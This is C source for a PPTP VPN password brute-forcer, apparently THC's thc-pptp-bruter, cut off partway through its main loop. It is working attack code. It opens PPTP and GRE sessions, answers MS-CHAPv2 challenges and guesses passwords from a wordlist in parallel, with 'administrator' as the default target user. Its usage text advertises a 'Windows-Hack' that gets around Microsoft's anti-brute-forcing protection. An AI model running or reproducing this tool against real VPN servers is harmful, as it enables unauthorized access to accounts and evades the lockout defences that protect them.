/* 
 * $Id:$
 *
 *  ***********************************************************************
 *  * THC PRIVATE * THC PRIVATE * THC PRIVATE * THC PRIVATE * THC PRIVATE *
 *  ***********************************************************************
 *                         http://www.thc.org
 *
 * 2004/06/04
 * THC / segfault consortium
 */

#include "common.h"
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <pty.h>
#include "pptp.h"
#include "pptp_gre.h"
#include "pptp_bruter.h"
#include "ppp_fcs.h"
#include "chap_ms.h"

/* PROTOTYPING */
static int send_lcp(int fd, struct _slot *slot, unsigned char code, unsigned char id, unsigned char *data, int len);
static int send_ppp_lcp(int fd, struct _slot *slot, unsigned char id, char *data, int len);
//static struct _slot *slot_lookup_first_free(void);
static int slot_new(PPTP *pptp, struct _slot *slot);
static int slot_next(struct _slot *slot);
static struct _slot *slot_lookup(unsigned short call_id);
static int send_first_gre(int fd, struct _slot *slot);
static char *asn_next(unsigned char *src, unsigned char *end, unsigned char *type, unsigned char *vlen);
static void timeout_reset(struct _slot *slot);
static void tv_add(struct timeval *dst, struct timeval *src, struct timeval *delta);
static int tv_cmp(struct timeval *a, struct timeval *b);
static void tv_sub_saturation(struct timeval *dst, struct timeval *a, struct timeval *b);
static void pptp_wait_established(int gre_fd, PPTP *pptp);

struct _opt opt;
static struct _slot slots[PPTP_BRUTER_MAX_SLOTS];

static int
pptp_call_open(PPTP *pptp, unsigned short call_id)
{
	int ret;

	struct _pptp_out_call_rqst packet = {
		PPTP_HEADER_CTRL(PPTP_OUT_CALL_RQST),
		0, 0, /* call_id, sernum */
		htonl(PPTP_BPS_MIN), htonl(PPTP_BPS_MAX),
		htonl(PPTP_BEARER_CAP), htonl(PPTP_FRAME_CAP),
		htons(PPTP_WINDOW), 0, 0, 0, {0}, {0}
	};

	packet.call_id = htons(call_id);
	ret = pptp_write(pptp, &packet, sizeof packet);
	return ret;
}

int
pptp_req_callid(PPTP *pptp, struct _slot *slot)
{
	static unsigned short call_id;

	/* start and warp around handling */
	if (call_id == 0)
		call_id = (getpid() % 4096) * 16;
	else if (call_id == 65535)
		call_id = 0;

	slot->gre.call_id = ++call_id;
	pptp_call_open(pptp, slot->gre.call_id);
	slot->state = SLOT_STATE_WAIT_CID;
	DEBUGF("SLOT starting with call_id %u ('%s'\n", call_id, slot->password);

	return 0;
}

/*
 * Note: We never read if we have something to write.
 */
static int
dispatch(int gre_fd, PPTP *pptp, char *buf, size_t len)
{
	ssize_t ret;
	struct _slot *slot;

	struct _pptp_header *header = (struct _pptp_header *)buf;
	union {
		struct _pptp_start_ctrl_conn *start;
		struct _pptp_stop_ctrl_conn *stop;
		struct _pptp_echo_rply *pong;
		struct _pptp_echo_rqst *ping;
		struct _pptp_out_call_rqst *call_req;
		struct _pptp_out_call_rply *call_res;
		struct _pptp_call_clear_rqst *clear_req;
		struct _pptp_call_clear_ntfy *clear_ntfy;
		struct _pptp_set_link_info *link_info;
		void *packet;
	} p;

	p.packet = buf;

	if (ntohl(header->magic) != PPTP_MAGIC)
		return 0;

	if (ntohs(header->pptp_type) != PPTP_MESSAGE_CONTROL)
		LOGRET(0, "Unknown PPTP message type (%d)\n", ntohs(header->pptp_type));

	if (len < PPTP_CTRL_SIZE(ntohs(header->ctrl_type)))
		LOGRET(0, "Shorten packet received. [type: %d, length: %d]\n", ntohs(header->ctrl_type), len);

	DEBUGF("pptp len %d, ctrl type %d\n", len, ntohs(header->ctrl_type));
	switch (ntohs(header->ctrl_type))
	{
	case PPTP_START_CTRL_CONN_RQST:
		break;
	case PPTP_START_CTRL_CONN_RPLY:
		if (ntohs(p.start->version) != PPTP_VERSION)
			goto pptp_conn_close;
		if ((p.start->result_code != 1) && (p.start->result_code != 0))
			goto pptp_conn_close;
		pptp->state = PPTP_STATE_ESTABLISHED;
		/*
		 * Firmware 2 OS mapping:
		 * 2195 - windows 2k
		 * 3790 - windows XP server 2003
		 */
		printf("PPTP Connection established.\n");
		printf("Hostname '%s', Vendor '%s', Firmware: %d\n", p.start->hostname, p.start->vendor, ntohs(p.start->firmware_rev));

		break;
	case PPTP_STOP_CTRL_CONN_RQST:
	{
		struct _pptp_stop_ctrl_conn reply = {
			PPTP_HEADER_CTRL(PPTP_STOP_CTRL_CONN_RPLY),
			1, PPTP_GENERAL_ERROR_NONE, 0
		};
		ret = pptp_write(pptp, &reply, sizeof reply);
		goto pptp_conn_close;	/* Dein Wunsch ist mir befehl! */
		break;
	}
	case PPTP_STOP_CTRL_CONN_RPLY:
		goto pptp_conn_close;
		break;
	case PPTP_ECHO_RPLY:
		break;
	case PPTP_ECHO_RQST:	/* 0x05 */
	{
		struct _pptp_echo_rply reply = {
			PPTP_HEADER_CTRL(PPTP_ECHO_RPLY),
			p.ping->identifier,
			1, PPTP_GENERAL_ERROR_NONE, 0
		};
		ret = pptp_write(pptp, &reply, sizeof reply);
		DEBUGF("Echo reply, wrote %d bytes\n", ret);
		break;
	}
	case PPTP_OUT_CALL_RQST:
	{
		struct _pptp_out_call_rply reply = {
			PPTP_HEADER_CTRL(PPTP_OUT_CALL_RPLY),
			0 /* callid */, p.call_req->call_id, 1, PPTP_GENERAL_ERROR_NONE, 0,
			htonl(PPTP_CONNECT_SPEED),
			htons(PPTP_WINDOW), htons(PPTP_DELAY), 0
		};
		reply.result_code = 7;	/* outgoind calls fobidden */
		ret = pptp_write(pptp, &reply, sizeof reply);
		break;
	}
	case PPTP_OUT_CALL_RPLY:
	{
		if (p.call_res->result_code != 1)
			goto pptp_conn_close;
		/* peer is OUR id [e.g. we set it!] and ID is peer's id */
		DEBUGF("Outgoing call established (local call ID %u, peer call ID %u)\n", ntohs(p.call_res->call_id_peer), ntohs(p.call_res->call_id));
		slot = slot_lookup(ntohs(p.call_res->call_id_peer));
		if (slot == NULL)
		{
			DEBUGF("Peer send infos for non-existing slot %d\n", htons(p.call_res->call_id_peer));
			break;
		}
		DEBUGF("password: '%s'\n", slot->password);
		//g_call_id = htons(p.call_res->call_id_peer);
		slot->gre.peer_call_id = ntohs(p.call_res->call_id);

		send_first_gre(gre_fd, slot);
		slot->state = SLOT_STATE_PPTP_CFGREQ_SENT;

		return 1;
		break;
	}
	case PPTP_CALL_CLEAR_RQST:	/* 12 */
	{
		struct _pptp_call_clear_ntfy reply = {
			PPTP_HEADER_CTRL(PPTP_CALL_CLEAR_NTFY),
			p.clear_req->call_id,
			1, PPTP_GENERAL_ERROR_NONE, 0, 0, {0}
		};
		/* FIXME: reply has wrong call_id. should be peer, not? */
		/* FIXME: restart slot with _new_ ID. */
		DEBUGF("call clear request received for peer_call_id %d\n", ntohs(p.clear_req->call_id));
		ret = pptp_write(pptp, &reply, sizeof reply);
		break;
	}
	case PPTP_CALL_CLEAR_NTFY:
		break;
	case PPTP_SET_LINK_INFO:
		break;
	default:
		LOGRET(0, "Unrecognized ctrl_type %d recevied\n", ntohs(header->ctrl_type));
		break;
	}

	return 0; /* All went fine... */
pptp_conn_close:
	DEBUGF("conneciton close here!\n");

	return -1;
}


static void
slots_init(PPTP *pptp, struct _slot *slots)
{
	int i;

	for (i = 0; i < opt.n_slots; i++)
		slot_new(pptp, &slots[i]);
}

#if 0
static struct _slot *
slot_lookup_first_free(void)
{
	int i;

	for (i = 0; i < opt.n_slots; i++)
		if (slots[i].state == SLOT_STATE_NONE)
			return &slots[i];
	return NULL;
}
#endif

static struct _slot *
slot_lookup(unsigned short call_id)
{
	int i;

	for (i = 0; i < opt.n_slots; i++)
	{
		DEBUGF("Slot local call id: %u, state %d\n", slots[i].gre.call_id, slots[i].state);
		if (slots[i].gre.call_id == call_id)
			return &slots[i];
	}

	return NULL;
}

/*
 * Search in memory region for asn type type and return ptr to it.
 * the payload length is stored in 'vlen'.
 *
 * Return NULL if not found.
 */
static char *
asn_extract(unsigned char *src, int len, unsigned char type, unsigned char *vlen)
{
	unsigned char *end = src + len;

	while (src + 2 < end)
	{
		if (*src != type)
		{
			src += *(src + 1);
			continue;
		}

		src++;
		if (*src + src >= end)
			return NULL;
		if (*src < 2)
			return NULL;
		*vlen = *src - 2;
		return src + 1;
	}

	return NULL;
}

/*
 * next asn.1 value. length of value is stored in vlen.
 */
static char *
asn_next(unsigned char *src, unsigned char *end, unsigned char *type, unsigned char *vlen)
{
	if (src + 2 > end)
		return NULL;
	*type = *src++;
	*vlen = *src++ - 2;
	if (src + *vlen > end)
		return NULL;

	return src;
}


/*
 * Return -1 if password is found.
 */
static int
gre_dispatch(int fd, PPTP *pptp, struct _slot *slot, unsigned char *buf, int len)
{
	struct _pptp_gre_header *header = (struct _pptp_gre_header *)buf;
	struct _ppp_header_addr *ppp_a;
	struct _ppp_header *ppp;
	struct _ppp_lcp_header *lcp;
	unsigned char asnlen;
	unsigned char type;
	unsigned char *ptr;
	unsigned char *end = buf + len;
	char resp[2048];	/* >= 49 */
	char *reject;
	int hdrsize;

	DEBUGF("INSIDE gre_dispathc: id %d, peer_id %d\n", slot->gre.call_id, slot->gre.peer_call_id);
	hdrsize = sizeof *header;
	if (!PPTP_GRE_IS_A(header->ver))
		hdrsize -= sizeof header->ack;
	if (!PPTP_GRE_IS_S(header->flags))
		hdrsize -= sizeof header->ack;

	ppp_a = (struct _ppp_header_addr *)(buf + hdrsize);
	ppp = (struct _ppp_header *)(buf + hdrsize);

	if (ppp_a->address == 0xff)
 		lcp = (struct _ppp_lcp_header *)(ppp_a->payload);
	else if (memcmp(ppp, "\xc2\x23", 2) == 0)
		lcp = (struct _ppp_lcp_header *)(ppp->payload);
	else {
		DEBUGF("Unknown GRE packet of len %d. Ignoring\n", len);
		hexdump(buf, len);
		return 0;	/* Unknown packet */
	}

	if (end - lcp->payload < 0)
	{
		DEBUGF("GRE without payload. Ignoring.\n");
		return 0;
	}
	//len -= (sizeof *header + sizeof _ppp_header);
	//if (len < ntohs(lcp->length))
		//return 0;
	/* Len is now the PAYLOAD length */
	len = ntohs(lcp->length) - sizeof *lcp;
	if (lcp->payload + len != end)
	{
		DEBUGF("Packet with wrong length.\n");
		return 0;
	}

	/* Parse ppp protocol. 
	 */
	if ((ppp_a->address == 0xff))	/* ESC code, ctrl following */
	{
		DEBUGF("lcp_code: %d, seq %d\n", lcp->code, header->seq);
		switch (lcp->code)
		{
		case 0x01:	/* Configuration request */
			slot->state = SLOT_STATE_CONF_RECV;
			/* First check if there are any options that we
			 * should reject. If nothing to reject then go on
			 * and nack/ack it to force challenge response.
			 */
			ptr = lcp->payload;
			reject = resp;
			while (1)
			{
				ptr = asn_next(ptr, end, &type, &asnlen);
				//DEBUGF("asn type %x, asnlen %d\n", type, asnlen);
				if (ptr == NULL)
					break;
				switch (type)
				{
				case 0x01:	/* Max. receive unit */
				case 0x03:	/* Authentication Protocol Options */
				case 0x05:	/* Magic number */
				case 0x07:	/* Protocol field compression */
				case 0x08:	/* Address/Ctrl field comp */
				case 0x0d:	/* Callback */
				case 0x13:	/* Multilink endpoint discreminiator */
					break;
				default:
					/* All others we dont accept. */
					if (reject + 2 + asnlen >= resp + sizeof resp)
						break;
					*reject++ = type;
					*reject++ = asnlen + 2;
					memcpy(reject, ptr, asnlen);
					reject += asnlen;
				}
				ptr += asnlen;
			}
			if (reject > resp)
			{
				send_lcp(fd, slot, 0x04, lcp->id, resp, reject - resp);
				return 0;
			}
				
			ptr = asn_extract(lcp->payload, len, 0x03, &asnlen);
			if ((ptr) && (asnlen >= 2))
			{
				//DEBUGF("auth type found, len %d %2.2x.%2.2x\n", asnlen, *ptr, *(ptr + 1));
				/* Other than MSCHAPv2? NAK it, propose MSCHAPv2 */
				/* onloy MS-CHAP-v2 with NT-AUTH. (0x81). LAter on att MD5 auth as well. */
				if ((memcmp(ptr, "\xc2\x23", 2) != 0) || (asnlen != 3) || (*(ptr + 2) != 0x81))
				{
					/* FIXME we might require some parameteres here */
					send_lcp(fd, slot, 0x03, lcp->id, "\x03\x05\xc2\x23\x81", 5);
					//send_lcp(fd, gre, 0x03, lcp->id, ptr - 2, asnlen + 2);
					break;
				}
				/* MS-CHAP-v2 requested. ACK this configuration! */
			}
			/* Otherwise accept all config requests */
			send_lcp(fd, slot, 0x02, lcp->id, lcp->payload, len);
			break;
		case 0x02:	/* Configuration ACK */
			break;
		case 0x04:	/* Configuration reject */
			/* FIXME: fatal! */
			break;
		case 0x06:	/* Termination ACK received */
			/* Send empty ack. */
			DEBUGF("SLOT %u ended. (termianted)\n", slot->gre.call_id);
			gre_write(fd, &slot->gre, NULL, 0);
			/* If windowshack then we go only in here if we
			 * terminated a LCP connection. We only terminate
			 * a LCP conn in WINDOWSHACKMODE if we ran out of
			 * passwords. In this case we send a TERM-REQ for
			 * that call_id out which must be ack'ed here (but
			 * no new call_id should be requested!)
			 */
			if (!(opt.flags & OPT_FLAGS_WINDOWSHACK))
				slot_new(pptp, slot);
			break;
		default:
			DEBUGF("Unknown lcp code %u\n", lcp->code);
		}
	} else if (ntohs(ppp->protocol) == 0xc223) {
		DEBUGF("small lcp code %d, seq %d\n", lcp->code, header->seq);
		switch (lcp->code)
		{
		case 0x01:	/* Challenge */
			slot->state = SLOT_STATE_CHL_RECV;
			DEBUGF("Challenge received\n");
			if (lcp->payload[0] != 16)
				break;
			if (lcp->payload + 1 + 16 > end)
				break;

#if 0
			memcpy(slot->challenge, lcp->payload + 1, sizeof slot->challenge);
			slot->lcp_id = lcp->id;

			ChapMS_v2(resp + 1, slot->challenge, slot->password, strlen(slot->password), opt.user);
			memcpy(resp + 1 + 49, opt.user, strlen(opt.user));
			resp[0] = 49;
			send_ppp_lcp(fd, slot, slot->lcp_id++, resp, 1 + 49 + strlen(opt.user));
#endif
#if 1
			ChapMS_v2(resp + 1, lcp->payload + 1, slot->password, strlen(slot->password), opt.user);
			memcpy(resp + 1 + 49, opt.user, strlen(opt.user));
			resp[0] = 49;
			send_ppp_lcp(fd, slot, lcp->id, resp, 1 + 49 + strlen(opt.user));
#endif
			break;
		case 0x03:	/* Success */
			return -1;
		case 0x04:	/* Failure */
			if (opt.flags & OPT_FLAGS_WINDOWSHACK)
			{
				/* FAILURE-resend from peer of previous pwd
				 * can overwrite current slot.
				 */
				if (slot->state == SLOT_STATE_FAILURE_RECV)
					break;
				if (slot_next(slot) != 0)
				{
					slot->state = SLOT_STATE_WAIT_TERM_ACK;
					send_lcp(fd, slot, 0x05, lcp->id, "unknown", 7);
					break;
				}
				slot->state = SLOT_STATE_FAILURE_RECV;
				send_first_gre(fd, slot);
			} else {
				slot->state = SLOT_STATE_WAIT_TERM_ACK;
				send_lcp(fd, slot, 0x05, lcp->id, "unknown", 7);
			}
#if 0
			ChapMS_v2(resp + 1, slot->challenge, slot->password, strlen(slot->password), opt.user);
			memcpy(resp + 1 + 49, opt.user, strlen(opt.user));
			resp[0] = 49;
			send_ppp_lcp(fd, slot, slot->lcp_id++, resp, 1 + 49 + strlen(opt.user));
#endif

			/* Wait for TERMINATION request */
			break;
		default:
			DEBUGF("Unknown lcp protocol code\n");
		}

	} else {
		DEBUGF("Unknown GRE payload\n");
	}

	return 0;
}

static int
send_ppp_lcp(int fd, struct _slot *slot, unsigned char id, char *data, int len)
{
	unsigned char buf[8196];
	struct _ppp_header *ppp = (struct _ppp_header *)buf;
	struct _ppp_lcp_header *lcp = (struct _ppp_lcp_header *)(buf + sizeof *ppp);

	ppp->protocol = htons(PROTO_PPP_CHL);

	lcp->code = 0x02;
	lcp->id = id;
	lcp->length = htons(4 + len);

	memcpy(&lcp->payload, data, len);
	timeout_reset(slot);

	return gre_write(fd, &slot->gre, buf, len + sizeof *ppp + sizeof *lcp);
}

static int
send_lcp(int fd, struct _slot *slot, unsigned char code, unsigned char id, unsigned char *data, int len)
{
	unsigned char buf[8196];
	struct _ppp_header_addr *ppp_a = (struct _ppp_header_addr *)buf;
	struct _ppp_lcp_header *lcp = (struct _ppp_lcp_header *)(buf + sizeof *ppp_a);

	ppp_a->address = 0xff;
	ppp_a->ctrl = 0x03;
	ppp_a->protocol = htons(PROTO_PPP_LCP);

	lcp->code = code;
	lcp->id = id;
	lcp->length = htons(4 + len);

	memcpy(&lcp->payload, data, len);
	timeout_reset(slot);

	return gre_write(fd, &slot->gre, buf, len + sizeof *ppp_a + sizeof *lcp);
}

static int
send_first_gre(int fd, struct _slot *slot)
{
	unsigned char buf[1024];
	struct _ppp_header_addr *ppp_a = (struct _ppp_header_addr *)buf;
	struct _ppp_lcp_header *lcp = (struct _ppp_lcp_header *)(buf + sizeof *ppp_a);
	char *ptr;
	int ret;

	ppp_a->address = 0xff;
	ppp_a->ctrl = 0x03;
	ppp_a->protocol = htons(PROTO_PPP_LCP);

	lcp->code = 0x01;
	lcp->id = 0x01;
	lcp->length = htons(14);

	ptr = lcp->payload;

	/* Add async control char map, magic number, protodol comp, add com
	 * manually.
	 */
	memcpy(lcp->payload, "\x02\x06\x00\x00\x00\x00\x07\x02\x08\x02", 10);

	ret = gre_write(fd, &slot->gre, buf, sizeof *ppp_a + sizeof *lcp + 10);
	if (ret < 0)
		fprintf(stderr, "ERROR: gre_write(): %s\n", strerror(errno));
	timeout_reset(slot);

	return 0;
}

void
hexdump(unsigned char *ptr, int len)
{
	int i;

	for (i = 0; i < len; i++)
		printf("%2.2x ", ptr[i]);
	printf("\n");
}

/*
 * fire off slot. pwd and stuff has aleady been initialized.
 */
static int
slot_start(PPTP *pptp, struct _slot *slot)
{
	GRE_init(&slot->gre);

	gettimeofday(&slot->start, NULL);
	memcpy(&slot->due_global, &slot->start, sizeof slot->due_global);
	slot->due_global.tv_sec += 180;

	timeout_reset(slot);
	pptp_req_callid(pptp, slot);

	return 0;
}

/*
 * Restart a slot. Use same password.
 */
static int
slot_restart(PPTP *pptp, struct _slot *slot)
{
	char pwd[32 + 1];
	struct timeval tv_now;

	/* TERM old call_id. we are getting a new one */
	gettimeofday(&tv_now, NULL);
	DEBUGF("SLOT %u restart after %ld seconds\n", slot->gre.call_id, tv_now.tv_sec - slot->start.tv_sec);
	memcpy(pwd, slot->password, strlen(slot->password) + 1);
	memset(slot, 0, sizeof *slot);
	memcpy(slot->password, pwd, strlen(pwd));

	return slot_start(pptp, slot);
}

/*
 * set new password.
 */
static int
slot_next(struct _slot *slot)
{
	char *ptr;
	struct timeval tv;
	
	//if ((fgets(slot->password, sizeof slot->password - 1, opt.wordlistfp) == NULL) || (opt.tries >= opt.n_slots))
	if (fgets(slot->password, sizeof slot->password - 1, opt.wordlistfp) == NULL)
	{
		slot->state = SLOT_STATE_NONE;
		return -1;
	}
	ptr = strchr(slot->password, '\n');
	if (ptr)
		*ptr = '\0';
	
	opt.tries++;

	/* Limit number of passwords / sec we read. This automaticly limits
	 * number of pwd's we try per second.
	 */
	if (opt.limit > 0)
	{
		//DEBUGF("due: %01ld.%06ld, now: %01ld.%06ld\n", opt.pwd_due.tv_sec, opt.pwd_due.tv_usec, opt.tv_now.tv_sec, opt.tv_now.tv_usec);
		while (tv_cmp(&opt.pwd_due, &opt.tv_now) > 0)
		{
			tv_sub_saturation(&tv, &opt.pwd_due, &opt.tv_now);
			DEBUGF("waiting for %01ld.%06ld sec\n", tv.tv_sec, tv.tv_usec);
			select(0, NULL, NULL, NULL, &tv);
			gettimeofday(&opt.tv_now, NULL);
		}
		tv_add(&opt.pwd_due, &opt.tv_now, &opt.pwd_delta);
	}

	return 0;
}

/*
 * Initialize a new slot structue.
 * - set password
 */
static int
slot_new(PPTP *pptp, struct _slot *slot)
{
	DEBUGF("SLOT new (old call_id %u), getting new pwd\n", slot->gre.call_id);
	memset(slot, 0, sizeof *slot);
	if (slot_next(slot) != 0)
		return -1;
	return slot_start(pptp, slot);
}

static void
usage(char *err)
{
	if (err)
		printf("%s", err);

	printf(""
"thc-pptp-bruter [options] <remote host IP>\n"
"  -v        Verbose output / Debug output\n"
"  -W        Disable windows hack [default: enabled]\n"
"  -u <user> User [default: administrator]\n"
"  -w <file> Wordlist file [default: stdin]\n"
"  -p <n>    PPTP port [default: 1723]\n"
"  -n <n>    Number of parallel tries [default: 5]\n"
"  -l <n>    Limit to n passwords / sec [default: 100]\n"
"\n"
"Windows-Hack reuses the LCP connection with the same caller-id. This\n"
"gets around MS's anti-brute forcing protection. It's enabled by default.\n"
"");
	exit(0);
}

static int
do_getopt(int argc, char *argv[])
{
	int c;


	while ((c = getopt(argc, argv, "Wvn:w:u:h:l:")) != -1)
	{
		switch (c)
		{
		case 'v':
			opt.flags |= OPT_FLAGS_VERBOSE;
			break;
		case 'l':
			opt.limit = atoi(optarg);
			if (opt.limit < 0)
				opt.limit = PPTP_BRUTER_DFL_LIMIT;
			break;
		case 'W':
			opt.flags &= ~OPT_FLAGS_WINDOWSHACK;
			break;
		case 'n':
			opt.n_slots = atoi(optarg);
			if (opt.n_slots <= 0)
				opt.n_slots = 1;
			if (opt.n_slots > PPTP_BRUTER_MAX_SLOTS)
				opt.n_slots = PPTP_BRUTER_MAX_SLOTS;
			break;
		case 'u':
			opt.user = optarg;
			break;
		case 'w':
			opt.wordlistfp = fopen(optarg, "r");
			if (opt.wordlistfp == NULL)
				PERREXIT("fopen(%s)", optarg);
		case 'h':
		default:
			usage(NULL);
		}
	}

	opt.host = argv[optind];
	if (opt.host == NULL)
		usage("Target IP missing.\n");

	return 0;
}

static int
init_defaults(void)
{
	memset(&opt, 0, sizeof opt);
	opt.n_slots = 5;
	opt.user = "administrator";
	opt.wordlistfp = stdin;
	opt.port = 1723;
	opt.flags |= OPT_FLAGS_WINDOWSHACK;
	opt.limit = PPTP_BRUTER_DFL_LIMIT;

	return 0;
}

static void
timeout_set(struct _slot *slot)
{
	/* At least two seconds timeout. Wont work otherwise. WIndows
	 * has timeout of 1 sec as well and goes crazy if we send packet
	 * when he retransmit packet :/
	 */
	gettimeofday(&slot->due, NULL);
	slot->due.tv_sec += slot->retrans_timeout + 2;
}

static void
timeout_reset(struct _slot *slot)
{
	slot->retrans_timeout = 0;
	timeout_set(slot);
}

static int
handle_timeout(int gre_fd, PPTP *pptp, struct _slot *slot)
{
	int ret;

#if 0
	if ((slot->retrans_timeout >= 60))
	{
		/* This call-id time'ed out complety. Does it make
		 * sense to send a terminate request? Will the peer
		 * answer? And if not? Better dont send term-req
		 * and just ack every incoming term-req even if
	 	 * slot does not exist for the call_id
		 */
		DEBUGF("Timeout (global) of slot. Requesting new call-id. (state: %d, '%s')\n", slot->state, slot->password);
		slot_restart(pptp, slot);
		
		return 0;
	}
#endif

	/* Handle timeout in this state */
	/* retransmit last package? */
	switch (slot->state)
	{
	case SLOT_STATE_PPTP_CFGREQ_SENT:
		ret = write(gre_fd, slot->gre.u.wbuf, slot->gre.wlen);
		DEBUGF("Timeout. Resending GRE packet (state: %d, len: %d, ret: %d)\n", slot->state, slot->gre.wlen, ret);
		break;
	case SLOT_STATE_WAIT_CID:
		/* This is hilarious. We have to retransmit on a TCP
		 * connection because windows is just braindead and
		 * the application drops packets when received to many
		 * call-id requests
		 */
		/* This is currently handled by slot-wide timeout (above) */
		break;
	default:
		/* Packetlost in WAIT_CID cant happen because it goes
		 * over TCP. This timeout is handled by global
		 * tmeout.
		 */
		break;
	}

	/* delay:
	 * 2 sec
	 * 2 sec
	 * 3 sec
	 * 10 sec
	 * 30 second
	 * 60 seconds -> restart entire slot.
	 */
	if (slot->retrans_timeout <= 0)
		slot->retrans_timeout = 2;
	else if (slot->retrans_timeout <= 2)
		slot->retrans_timeout = 3;
	else if (slot->retrans_timeout <= 3)
		slot->retrans_timeout = 10;
	else if (slot->retrans_timeout <= 10)
		slot->retrans_timeout = 30;
	else if (slot->retrans_timeout <= 30)
		slot->retrans_timeout = 60;
	timeout_set(slot);

	return 0;
}

static void
show_status(void)
{
	struct timeval tv_now;
	int h, m, s;
	unsigned int sec;
	float ftries, fsec;
	float cs, lcs;
	static int last_tries;
	static struct timeval tv_last;

	gettimeofday(&tv_now, NULL);
	if ((tv_last.tv_sec == 0) && (tv_last.tv_usec == 0))
		memcpy(&tv_last, &tv_now, sizeof tv_last);

	sec = tv_now.tv_sec - opt.start.tv_sec;
	s = sec % 60;
	m = (sec / 60) % 60;
	h = sec / 3600;

	fsec = MAX(sec, 1);
	ftries = MAX(opt.tries, 1);
	cs = ftries / fsec;

	/* calc c/s for last 5 seconds or something between */
	tv_sub_saturation(&tv_last, &tv_now, &tv_last);
	fsec = tv_last.tv_sec * 100 + tv_last.tv_usec / 10000;
	if (fsec == 0)
		lcs = cs;
	else {
		ftries = MAX(opt.tries - last_tries, 1);
		lcs = (ftries / fsec) * 100;
	}
	
	printf("%u passwords tested in %uh %02um %02us (%01.02f %01.02f c/s)\n", opt.tries, h, m, s, lcs, cs);

	last_tries = opt.tries;
	memcpy(&tv_last, &tv_now, sizeof tv_last);
}

static int
pptp_reconnect(int gre_fd, PPTP *pptp)
{
	int ret;

	if (pptp->sox >= 0)
	{
		close(pptp->sox);
		pptp->sox = -1;
	}
	while (1)
	{
		ret = pptp_open(pptp, inet_addr(opt.host), htons(opt.port));
		if (ret >= 0)
		{
			pptp_wait_established(gre_fd, pptp);
			return ret;
		}
		//fprintf(stderr, "connect %s:%d failed: %s\n", opt.host, opt.port, strerror(errno));
		sleep(63);
	}

	return -1;
}

/*
 * return -1 if a < b
 * return 0  if a == b
 * return 1  if a > b
 */
static int
tv_cmp(struct timeval *a, struct timeval *b)
{
	if (a->tv_sec < b->tv_sec)
		return -1;
	if (a->tv_sec > b->tv_sec)
		return 1;

	if (a->tv_usec < b->tv_usec)
		return -1;
	if (a->tv_usec > b->tv_usec)
		return 1;

	return 0;
}

static void
set_due(struct timeval *dst, struct timeval *src, int sec)
{
	memcpy(dst, src, sizeof *dst);
	dst->tv_sec += sec;
}

/*
 * dst = src + delta
 */
static void
tv_add(struct timeval *dst, struct timeval *src, struct timeval *delta)
{
	dst->tv_sec = src->tv_sec + delta->tv_sec;
	dst->tv_usec = src->tv_usec + delta->tv_usec;
	if (dst->tv_usec >= 1000000)
	{
		dst->tv_sec++;
		dst->tv_usec -= 1000000;
	}
}

/*
 * dst = a - b
 * but with saturation to 0.0 (not less than 0)
 */
static void
tv_sub_saturation(struct timeval *dst, struct timeval *a, struct timeval *b)
{
	/* Convert to timeval suiteable for select() call */
	if (tv_cmp(a, b) <= 0)
	{
		memset(dst, 0, sizeof *dst);
		return;
	}
	dst->tv_sec = a->tv_sec - b->tv_sec;

	if (a->tv_usec <= b->tv_usec)
	{
		if (a->tv_usec == b->tv_usec)
			dst->tv_usec = 0;
		else {  /* a < b */
			dst->tv_usec = 1000000 - (b->tv_usec - a->tv_usec);
			dst->tv_sec--;
		}
	} else
		dst->tv_usec = a->tv_usec - b->tv_usec;
}
			

static void
init_vars(void)
{
	opt.pwd_delta.tv_sec = 0;
	opt.pwd_delta.tv_usec = 999999 / opt.limit;
	gettimeofday(&opt.tv_now, NULL);
	gettimeofday(&opt.start, NULL);

	tv_add(&opt.pwd_due, &opt.start, &opt.pwd_delta);
}

static void
pptp_wait_established(int gre_fd, PPTP *pptp)
{
	char buf[4096];
	int ret;

	/* Wait until it's in connected state */
	while (pptp->state != PPTP_STATE_ESTABLISHED)
	{
		ret = pptp_read(pptp, buf, sizeof buf);
		dispatch(gre_fd, pptp, buf, ret);
	}
}


int
main(int argc, char *argv[])
{
	struct _pptp pptp;
	int ret;
	char buf[4096];
	int gre_fd;
	int maxfd;
	int i;
	struct _slot *slot;


	init_defaults();
	do_getopt(argc, argv);
	init_vars();

	/* Fire up ppp in --sync mode and read packets */
	gre_fd = pptp_gre_bind(inet_addr(opt.host));
	if (gre_fd < 0)
		PERREXIT("gre socket/connect");

	/* Open pptp connection */
	ret = pptp_open(&pptp, inet_addr(opt.host), htons(opt.port));
	if (ret < 0)
		PERREXIT("Failed to open pptp connection");
	pptp_wait_established(gre_fd, &pptp);

	slots_init(&pptp, slots);

	while (1)
	{
		struct timeval tv;
		fd_set rfds;
		int n;
		unsigned short call_id;
		int slots_running;
		
		maxfd = MAX(gre_fd, pptp.sox);
	
		FD_ZERO(&rfds);
		FD_SET(gre_fd, &rfds);
		FD_SET(pptp.sox, &rfds);

		slots_running = 0;
		/* Max wait 5 seconds */
		//gettimeofday(&opt.tv_now, NULL);
		set_due(&tv, &opt.tv_now, 5);
		for (i = 0; i < opt.n_slots; i++)
		{
			if (slots[i].state <= SLOT_STATE_NONE)
				continue;
			if (slots[i].state >= SLOT_STATE_RESTARTABLE)
				slots_running++;

			DEBUGF("Slot %d state %d running with '%s', retrans %d, due %ld.%06ld now %ld.%06ld\n", i, slots[i].state, slots[i].password, slots[i].retrans_timeout, slots[i].due.tv_sec, slots[i].due.tv_usec, opt.tv_now.tv_sec, opt.tv_now.tv_usec);
			/* Check if anyone time'd out */
			if (tv_cmp(&slots[i].due_global, &opt.tv_now) < 0)
			{
				DEBUGF("Timeout (global) of slot. Requesting new call-id. (state: %d, '%s')\n", slots[i].state, slots[i].password);
				slot_restart(&pptp, &slots[i]);

			} else if (tv_cmp(&slots[i].due, &opt.tv_now) < 0) {
				handle_timeout(gre_fd, &pptp, &slots[i]);
			}

			if (tv_cmp(&tv, &slots[i].due) > 0)
				memcpy(&tv, &slots[i].due, sizeof tv);
		}
		if (slots_running <= 0)
		{
			show_status();
			exit(0);
		}
		/* Every 5 seconds show the status */
		if (tv_cmp(&opt.tv_now, &opt.status_due) > 0)
		{
			show_status();
			set_due(&opt.status_due, &opt.tv_now, 5);
		}
		if (tv_cmp(&tv, &opt.status_due) > 0)
			memcpy(&tv, &opt.status_due, sizeof tv);
		
		tv_sub_saturation(&tv, &tv, &opt.tv_now);

